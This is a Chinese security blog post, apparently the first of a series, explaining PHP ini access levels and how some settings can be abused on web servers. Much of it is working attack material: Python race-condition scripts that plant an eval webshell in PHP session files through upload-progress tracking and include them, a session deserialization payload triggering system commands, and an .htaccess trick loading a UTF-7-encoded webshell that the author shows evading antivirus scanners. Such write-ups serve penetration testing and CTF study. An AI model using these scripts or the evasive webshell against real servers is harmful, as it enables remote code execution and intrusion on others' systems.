> 原文链接: https://www.anquanke.com//post/id/197644 


# 谈谈php配置项在渗透中的利用姿势（一）


                                阅读量   
                                **811344**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t010748277fdc71ec08.jpg)](https://p5.ssl.qhimg.com/t010748277fdc71ec08.jpg)



php配置项关系到php开发中的方方面面，其中一些选项与安全息息相关，本文将详细讨论php的各项配置对安全的影响。由于php的配置项为数众多，本文将分为若干篇进行谈论。由于本人入行时间较短，水平有限，文中如有不足之处欢迎各位师傅多多指正。



## 0x01 基础知识

**php配置项的访问级别**

不同的php配置项根据其访问级别具有不同的配置方式，根据php手册的描述，有下列四种访问级别，不同的访问级别对应的配置方式如下表：

|模式<th style="text-align: center;">含义</th>
|------
|PHP_INI_USER<td style="text-align: center;">可在用户脚本（例如 `ini_set()`）或 Windows 注册表（自 PHP 5.3 起）以及`.user.ini`中设定</td>
|PHP_INI_PERDIR<td style="text-align: center;">可在 `php.ini`、`.user.ini`、`.htaccess`或 `httpd.conf`中设定</td>
|PHP_INI_SYSTEM<td style="text-align: center;">可在`php.ini`或`httpd.conf`中设定</td>
|PHP_INI_ALL<td style="text-align: center;">可用以上任何方式设定</td>

访问级别实际上是一种掩码表示方式，其中PHP_INI_USER对应1、PHP_INI_PERDIR对应2（即二进制的10）、PHP_INI_SYSTEM对应4（即二进制的100），而PHP_INI_ALL与其字面的意思相符，为所有掩码的集合，为7（即二进制的111）。实际上访问级别除了1、2、4、7以外还有3、5、6的可能性，不过PHP没有给这些访问级别定义常量。

**如何获取某个配置项的访问级别**

获取php配置项的函数为`ini_get_all()`,其函数原型为：

`array ini_get_all ([ string $extension [, bool $details = true ]] )`

第一个参数`extension`为需要获取设置信息的配置项名称。如果设置了，此函数仅仅返回指定该扩展的配置选项，否则返回所有配置项的信息。第二个参数`details`默认为`true`（获取详细信息），设置为`false`时，这个值会是选项的当前值。

当`details`为`true`时,返回信息中将包含各配置项的访问级别。

例如这行代码的输出：`&lt;?php print_r(ini_get_all(null));?&gt;`

```
Array
(
    [allow_url_fopen] =&gt; Array
        (
            [global_value] =&gt; 1
            [local_value] =&gt; 1
            [access] =&gt; 4
        )

    [allow_url_include] =&gt; Array
        (
            [global_value] =&gt; 
            [local_value] =&gt; 
            [access] =&gt; 4
        )
...
```

从中就可以看到`allow_url_fopen`这个选项的访问级别为4，对应PHP_INI_SYSTEM,那么它就只能在`php.ini`或`httpd.conf`中设定，而在程序中使用ini_set(‘allow_url_fopen’,1)强行设置虽然不会报错，但不会生效：

```
&lt;?php 
ini_set('allow_url_fopen',0);
var_dump(ini_get('allow_url_fopen'));
?&gt;
```

输出：

```
D:phpstudy_proWWW1.php:4:string '1' (length=1)
```

获取不同访问级别配置项的脚本如下：

```
&lt;?php
$arr = ini_get_all();
$req = [];
foreach($arr as $k =&gt; $v)`{`
    if($v['access'] == 1)`{`  //FUZZ访问级别为1的选项就是1，以此类推
        $req[$k] = $v;
    `}`
`}`
print_r(count($req));
print_r($req);
?&gt;
```

** 补充知识：如何利用Apache 的配置文件（例如`httpd.conf`）和`.htaccess`来修改PHP的配置设定 **

有下列几个`Apache`指令可以使用户在`Apache`配置文件内部修改PHP的配置:

1.`php_value name value`

设定指定的值。只能用于`PHP_INI_ALL`或`PHP_INI_PERDIR`类型的指令。要清除先前设定的值，把`value`设为`none`。

2.`php_flag name on|off`

用来设定布尔值的配置指令。仅能用于`PHP_INI_ALL`和`PHP_INI_PERDIR`类型的指令。

3.`php_admin_value name value`

设定指定的指令的值。不能用于`.htaccess`文件。任何用`php_admin_value`设定的指令都不能被`.htaccess`或`virtualhost`中的指令覆盖。要清除先前设定的值，把`value`设为`none`。

4.`php_admin_flag name on|off`

用来设定布尔值的配置指令。不能用于`.htaccess`文件。任何用 `php_admin_flag`设定的指令都不能被`.htaccess`或`virtualhost`中的指令覆盖。



## 0x02不同访问级别的php配置项

对于以php为后端处理语言的web目标，如果想在php配置项上做文章，必须考虑所要利用的php配置项的访问级别问题。所以，在下文中，把php配置项按照其访问级别来分类讨论,与安全相关不大或难以利用的配置项将只做简单介绍，当然其中一些配置项的利用方式可能较为苛刻，在实际场景中出现的几率不大，不过可能会作为ctf比赛的出题思路。

测试环境：<br>
Ubuntu16.04 x64<br>
Apache版本：Apache/2.4.18<br>
PHP版本：v7.0.33

首先是`access`级别为1的选项,即只能在用户脚本（例如`ini_set()`）或 Windows 注册表（自 PHP 5.3 起）以及`.user.ini`中设定结果的选项，运行脚本的结果为空，也就是说不存在这样的选项。

### <a class="reference-link" name="access%E7%BA%A7%E5%88%AB%E4%B8%BA2%E7%9A%84php%E9%85%8D%E7%BD%AE%E9%A1%B9"></a>access级别为2的php配置项

获取`access`级别为2的选项，即只能在`php.ini`,`.htaccess` 或 `httpd.conf` 中设定的选项，结果共有下列11项（数目可能会略有差别，应该是因为各个环境安装的php扩展不同所致）：

|name<th style="text-align: center;">global_value</th><th style="text-align: center;">local_value</th><th style="text-align: center;">access</th>
|------
|mysqlnd.sha256_server_public_key<td style="text-align: center;"></td><td style="text-align: center;"></td><td style="text-align: center;">2</td>
|openssl.cafile<td style="text-align: center;"></td><td style="text-align: center;"></td><td style="text-align: center;">2</td>
|openssl.capath<td style="text-align: center;"></td><td style="text-align: center;"></td><td style="text-align: center;">2</td>
|session.auto_start<td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">2</td>
|session.upload_progress.cleanup<td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">2</td>
|session.upload_progress.enabled<td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">2</td>
|session.upload_progress.freq<td style="text-align: center;">1%</td><td style="text-align: center;">1%</td><td style="text-align: center;">2</td>
|session.upload_progress.min_freq<td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">2</td>
|session.upload_progress.name<td style="text-align: center;">PHP_SESSION_UPLOAD_PROGRESS</td><td style="text-align: center;">PHP_SESSION_UPLOAD_PROGRESS</td><td style="text-align: center;">2</td>
|session.upload_progress.prefix<td style="text-align: center;">upload_progress_</td><td style="text-align: center;">upload_progress_</td><td style="text-align: center;">2</td>
|zend.multibyte<td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">2</td>

各项的具体作用如下：

1、 `mysqlnd.sha256_server_public_key`:配置指令来允许mysqli使用新的MySQL认证协议。

2、 `openssl.cafile`:在验证SSL/TLS时 系统上 证书颁发机构(CA)本地文件的位置。

3、 `openssl.capath`:如果未指定openssl.cafile或未找到CA文件，则会搜索openssl.capath指向的目录以获取合适的证书。

4、 `session.auto_start`:会话模块是否在请求开始时自动启动一个会话。默认为 0（不启动）。`session.auto_start`通过某种方式设置为1时，即使被访问的php页面中没有`session_start()`语句，也会启动一个session会话并生成session文件，如果此时`session.use_strict_mode`设置为0（默认就是0），那么浏览器端就可以控制`PHPSESSID`的值，使得服务器生成对应的sess文件（例如浏览器端设置`PHPSESSID`的值为`helloworld`,那么服务器端就会生成的sess文件名就是`sess_helloworld`），这本身并不是什么大问题，但是配合下面的一些配置选项却可以达到getshell的效果。

5、`session.upload_progress.cleanup`：一旦读取了所有POST数据，就会清除进度信息 (即上传完成)，与下面要讲的`session.upload_progress.enabled`息息相关。

6、 `session.upload_progress.enabled`:在`$_SESSION`中启用上传进度跟踪,默认开启。

7、 `session.upload_progress.freq`:上传进度应该如何更新。给定以百分比（每个文件）或以字节为单位。

8、`session.upload_progress.min_freq`:更新之间的最小延迟（以秒为单位）。

9、`session.upload_progress.name`:包含上传进度信息的`$_SESSION`中的索引名称(与前缀连接)。当它出现在表单中，php将会报告上传进度，它的值可控；

10、 `session.upload_progress.prefix`:`$_SESSION`用于上传进度的前缀。

在`session.upload_progress.enabled`开启时，当向目标php应用上传文件时，会将文件信息写入session文件（当然前提是目标php启动了session会话，即代码中有session_start()或者session.auto_start配置项为1），由于`session.upload_progress.name`可控(其实上传文件名也是可控的可利用的），就可以向session文件写入恶意代码，如果存在文件包含漏洞，则可以getshell（不过由于`session.upload_progress.cleanup`默认开启，即上传结束我们的恶意代码就会被清除，所以还要利用条件竞态或者自包含崩溃）。

测试环境：<br>
目标网站文件结构：

```
/var/www/html/
|-- index.php
|   
    |-- upload
    |       |-- test.php
    |       |-- .htaccess
```

index.php内容任意<br>
test.php中内容如下：

```
include($_GET[file]);
```

.htaccess中内容如下(注意要使`.htaccess`生效，apache需要开启rewrite模块)：

```
php_value session.auto_start 1
```

session文件存储路径:`/var/lib/php/sessions/`

利用脚本：

```
#coding:utf-8

import io
import requests
import threading

sessid = 'helloworld'
data = `{`"cmd":"system('whoami');"`}`

def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post('http://target.com/upload/test.php',data=`{`'PHP_SESSION_UPLOAD_PROGRESS':'&lt;?php eval($_POST[cmd]);?&gt;'`}`,files=`{`'file':('test.txt',f)`}`,cookies=`{`'PHPSESSID':sessid`}`)

def read(session):
    while True:
        resp = session.post('http://target.com/upload/test.php?file=/var/lib/php/sessions/sess_' + sessid,data=data,cookies=`{`'PHPSESSID':sessid`}`)
        if 'test.txt' in resp.text:
            print(resp.text)
            break
        else:
            print("[+++++++++++++]retry")

    event.clear()

if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(1,30):
            threading.Thread(target=write,args=(session,)).start()

        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()

    event.set()
```

利用条件竞态包含到的session文件sess_helloworld的内容：

[![](https://p2.ssl.qhimg.com/t0132d06f1bac38ae01.png)](https://p2.ssl.qhimg.com/t0132d06f1bac38ae01.png)

其中圈中部分是命令执行的结果。

稍微总结一下，这种攻击方式所需的条件有以下几点：

（1）存在文件包含漏洞<br>
（2）开启了session存储机制（`session_start()`或者`session.auto_start`设置为1，或者rewrite开启，并可以上传`.htaccess`）<br>
（3）`session.upload_progress.enabled`必须开启，不过这是默认的设置<br>
（4）`session.use_strict_mode`设置为0,可以控制sess文件名，这也是默认的配置<br>
（5）session文件存储路径已知，默认为`/tmp`或者`/var/lib/php/sessions/`

如果将上面场景中的文件包含漏洞代码换成存在可反序列化利用的类，那么就可以造成反序列化漏洞，不过这里要利用上传文件名来构造payload，并且要利用php`session`序列化处理机制的差异性，所以还要用到<br>`ini_set('session.serialize_handler', 'php_serialize')`或<br>
者`session_start(['serialize_handler'=&gt;'php_serialize'])`或者利用`.htaccess`覆盖`session.serialize_handler`配置项。另外，如果反序列化的类未注册或不在当前访问的php代码的作用域内，那么就要考虑使用内置类或者利用`unserialize_callback_func`配置项来加载类。

这里先简单演示要反序列化类已注册的例子，后面介绍到其他配置项时再介绍类未注册的情况：

测试环境：

目标网站文件结构：

```
/var/www/html/
|-- index.php
|
|-- upload
|       |-- test2.php
|       |-- .htaccess
```

index.php文件内容：

```
&lt;?php
ini_set('session.serialize_handler','php');
session_start();
class MyTest`{`
    public $str;
    public function __destruct()`{`
        eval($this-&gt;str);
    `}`
`}`
```

test2.php文件内容为空：

.htaccess文件内容：

```
php_value session.serialize_handler php_serialize
php_value session.auto_start 1
```

分析：访问`test.php`时，由于`.htaccess`中配置的作用，将启用`session`存储，那么就可以利用上一个场景中的攻击方式向session文件注入`MyTest`对象序列化后的数据，同时利用条件竞态访问`index.php`，由于其中启用了`session_start()`,并且`session`序列化处理方式与访问`test.php`时的不同,就可以触发反序列化漏洞。

利用方式：

构造序列化数据：

```
&lt;?php
class MyTest`{`
    public $str;
    public function __destruct()`{`
        eval($this-&gt;str);
    `}`
`}`

$a = new MyTest();
$a-&gt;str = "system('whoami');";
$s = serialize($a);
echo str_replace("O:6:","|O:6:",$s);
//"|O:6:"MyTest":1:`{`s:3:"str";s:17:"system('whoami');";`}`"
```

攻击脚本:

由于python使用request库上传文件时，filename字段的值会被urlencode，导致session中反序列化失败，所以要抓包修改一下，以下脚本用于生成上传文件的包。

```
import requests

sessid = 'helloworld'

def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        proxy = `{`
        'http': '127.0.0.1:8866'
        `}`
        filename = "|O:6:"MyTest":1:`{`s:3:"str";s:17:"system('whoami');";`}`"
        resp = session.post('http://target.com/upload/test2.php',data=`{`'PHP_SESSION_UPLOAD_PROGRESS':'test'`}`,files=`{`'file':(filename,f)`}`,cookies=`{`'PHPSESSID':sessid`}`,proxies=proxy)
```

将抓取的包中filename字段被urlencode的部分修改回来：

[![](https://p3.ssl.qhimg.com/t016e02d35fe7a66ad2.png)](https://p3.ssl.qhimg.com/t016e02d35fe7a66ad2.png)

然后送到Intruder模块，用null payload，线程设置为10，保持持续发送，

接下来是访问`index.php`触发反序列化的脚本：

```
import requests
import threading

sessid = 'helloworld'

def read(session):
    while True:
        resp = session.post('http://target.com/index.php',cookies=`{`'PHPSESSID':sessid`}`)
        if 'www-data' in resp.text:
            print(resp.text)
            break
        else:
            print("[+++++++++++++]retry")

    event.clear()

if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        #for i in range(1,30):
        #    threading.Thread(target=write,args=(session,)).start()

        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()

    event.set()
```

运行此脚本，触发了MyTest对象的反序列化：

[![](https://p0.ssl.qhimg.com/t016808bd6548ccaf93.png)](https://p0.ssl.qhimg.com/t016808bd6548ccaf93.png)

这种攻击方式所需的条件与上一个场景基本相同，不同的地方是要利用session反序列化漏洞需要找到session序列化机制的差异点。
<li>
`zend.multibyte`： 默认为0，设置为1时启用多字节编码的源文件解析,例如需要输出unicode字符的情况就要开启此设置，要使用此功能，必须启用mbstring扩展。<br>
值得一提的是该选项配合`zend.script_encoding`,可以起到极好的webshell免杀效果，例如在开启rewrite模块的apache某个目录下放一个.htaccess文件，其内容如下：
<pre><code class="hljs nginx">php_value auto_prepend_file "/tmp/1.txt"
php_value zend.multibyte 1
php_value zend.script_encoding "UTF-7"
</code></pre>
<p>/tmp/1.txt中的内容(UTF7编码后的webshell）：<br>`+ADw-?php+ACA-eval(+ACQ-+AF8-POST+AFs-1+AF0-)+ADs-?+AD4-`<br>
随后，访问与.htaccess同目录的任意php文件，即可用菜刀连接。<br>
附上1.txt在virscan.org的扫描结果：<br>[![](https://p4.ssl.qhimg.com/t01c6db36617f4f965b.png)](https://p4.ssl.qhimg.com/t01c6db36617f4f965b.png)<br>
一路绿灯。。。</p>
</li>
（未完待续，下一篇讨论访问级别为4的配置项）

参考：

[php扩展开发](https://www.php.cn/php-weizijiaocheng-392678.html)<br>[php.ini 配置选项列表](https://www.php.net/manual/zh/ini.list.php)<br>[PHP:怎样修改配置设定](https://www.php.net/manual/zh/configuration.changes.php)<br>[PHP 连接方式介绍以及如何攻击 PHP-FPM](https://forum.90sec.com/t/topic/129)<br>[无需sendmail：巧用LD_PRELOAD突破disable_functions](https://www.freebuf.com/articles/web/192052.html)<br>[PHP.ini PHP配置文件中文翻译](https://www.jianshu.com/p/2fe37219f6a5)<br>[利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/vuls/202819.html)<br>[深入浅出LD_PRELOAD &amp; putenv()](https://www.anquanke.com/post/id/175403)<br>[https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/)
